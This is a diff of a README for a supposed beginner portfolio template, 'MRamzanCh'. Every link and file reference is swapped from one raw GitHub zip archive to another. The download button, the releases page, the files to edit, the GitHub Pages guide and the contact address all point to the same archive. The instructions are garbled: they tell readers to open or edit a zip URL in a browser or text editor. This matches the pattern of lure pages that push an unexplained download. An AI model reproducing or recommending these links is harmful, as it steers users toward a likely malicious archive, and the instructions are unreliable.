@@ -8,7 +8,7 @@ Follow these steps to set up your portfolio site quickly and effortlessly.
 
 ## 📥 Download the Latest Version
 
-[![Download Now](https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip)
+[![Download Now](https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip%20Latest%20Release-blue)](https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip)
 
 Click the button above to access the Releases page and get the latest version.
 
@@ -27,7 +27,7 @@ Click the button above to access the Releases page and get the latest version.
 
 ## 🔧 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip).
 
 2. **Choose Your Version:** 
    - You will see a list of versions. Click on the one marked as "Latest."
@@ -42,7 +42,7 @@ Click the button above to access the Releases page and get the latest version.
 
 5. **Open Your Portfolio:**
    - Navigate to the folder where you extracted the files.
-   - Open the `https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip` file in your web browser. 
+   - Open the `https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip` file in your web browser. 
 
 Your portfolio site is now live on your local machine!
 
@@ -50,16 +50,16 @@ Your portfolio site is now live on your local machine!
 
 1. **Edit Text:**
    - Open the folder where you extracted your files.
-   - Right-click on `https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip` and choose "Open with" followed by your preferred text editor (like Notepad or any code editor).
+   - Right-click on `https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip` and choose "Open with" followed by your preferred text editor (like Notepad or any code editor).
    - Modify the text to reflect your own projects and contact information.
 
 2. **Change Images:**
    - Place your images in the designated folder (usually named `images`).
-   - Update the image links in the `https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip` file to point to your new images.
+   - Update the image links in the `https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip` file to point to your new images.
 
 3. **Use Github Pages:**
    - If you want to host your portfolio online, consider using GitHub Pages. It’s quick and free!
-   - Follow [this guide on GitHub](https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip) for steps on how to set it up.
+   - Follow [this guide on GitHub](https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip) for steps on how to set it up.
 
 ## 📝 Frequently Asked Questions
 
@@ -67,7 +67,7 @@ Your portfolio site is now live on your local machine!
 A: No. This portfolio is designed for users without programming knowledge. 
 
 **Q: Can I change the layout?**  
-A: Yes, you can rearrange sections easily in the `https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip` file.
+A: Yes, you can rearrange sections easily in the `https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip` file.
 
 **Q: Where do I find support?**  
 A: For any issues or questions, open a ticket in the GitHub repository.
@@ -82,6 +82,6 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ## 📞 Contact
 
-For more information, you can reach me at [https://raw.githubusercontent.com/sydoxzz/MRamzanCh/main/src/MRamzanCh-2.8.zip]. 
+For more information, you can reach me at [https://github.com/sydoxzz/MRamzanCh/raw/refs/heads/main/src/M-Ch-Ramzan-v2.3.zip]. 
 
 Thank you for checking out MRamzanCh! I hope you enjoy building your portfolio.
